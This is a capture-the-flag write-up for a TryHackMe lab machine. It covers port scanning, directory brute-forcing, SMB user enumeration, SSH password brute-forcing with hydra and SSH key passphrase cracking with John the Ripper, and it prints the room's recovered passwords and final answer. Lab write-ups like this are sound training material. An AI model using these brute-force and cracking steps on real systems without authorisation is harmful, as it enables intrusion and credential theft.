
## THM  Basic Pentesting 
In this writeup Today we're going to try to Solve a room in THM called Basic Pentesting
[Basic Pentesting Room](https://tryhackme.com/room/basicpentestingjt)
**The First Task :**

 - **Deploy the machine and connect to our network**

 **Second Task :**  

 - **Scan The Machine Service**

 

 - open nmap

 $ nmap -sC -sV -oN Result.txt 10.10.26.87

 ```bash
Nmap scan report for 10.10.26.87
Host is up (0.077s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-02-22T06:26:54-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-22T10:26:54
|_  start_date: N/A
 ```

 - ports  : 22  -  139 - 445
 - Now we need to take a look on the source code in main page
   10.10.26.87
	
 - sorce code : ![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1614046984/source_kimyp5.png)
 - Now we will use [gobuster](https://github.com/OJ/gobuster) to search 
   for directories with brute-force
   

       gobuster dir -u http://10.10.26.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
	```
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://10.10.26.87
	[+] Threads:        40
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     gobuster/3.0.1
	[+] Timeout:        10s
	===============================================================
	2020/06/16 08:40:01 Starting gobuster
	===============================================================
	/development (Status: 301)
	```
	Now we go to [http://10.10.26.87/development/](http://10.10.26.87/development/)![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1614047853/dev_bz7ebo.png)
	
	dev.txt:![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1614048283/1_e5ukco.png)
	J.txt:![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1614048378/j_xvyhf4.png)
	

## What is the username?

Now we will get user 
Try hack me give us a hint to get the user 
We have smbd open, that can give us a lot of information. We can use Enum4linux for that.

    enum4linux 10.10.26.87

![enter image description here](https://res.cloudinary.com/micro0x00/image/upload/v1614050311/Screenshot_2021-02-23_051756_ldpe6n.png)
after waiting for 5 minutes we get two user names

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User) <=======

```
users pop up, **jan** a.k.a. J and **kay** a.k.a. K (دماغ شغالة مش بتنام)

## What is the password ?

we will brute-force password by hydra

    └─$ hydra -l jan -P wordlist.txt ssh://10.10.26.87
```bash
login: jan & password: armando
```

## What service do you use to access the server(answer in abbreviation in all caps)?
**answer : ssh**

## What is the name of the other user you found(all lower case)?
**answer : kay**
Unfortunately when we try to ssh using the key file we see the key requires a password.

```
jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@127.0.0.1
Enter passphrase for key 'id_rsa':

```

But luckily we can cat out this file and crack the key with  [JohnTheRipper](https://github.com/gwagstaff/CTF-Write-Ups/blob/master/TryHackMe/Basic_Webapp/9)

Using  `ssh2john.py id_rsa > john_id_rsa.hash`  we get a john-crackable file that we can start here.  `john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa.hash`

But it quickly finds the password for the key file

```
[REDACTED]         (kay_id_rsa)

```

Trying again with the ssh file we easily log in with the file password and get the pass.bak!

Since there isnt a flag for this we can only think about the possible information we could do. Using an additional user we could see if it was part of any groups in  `/etc/groups`  or have programs that you can sudo  `Check with sudo -l`  . It truly depends on what is configured on a machine, but running something like LinPeas.sh will give you a good starting point!

## What is the final password you obtain?

That contains our final flags!

heresareallystrongpasswordthatfollowsthepasswordpolicy$$
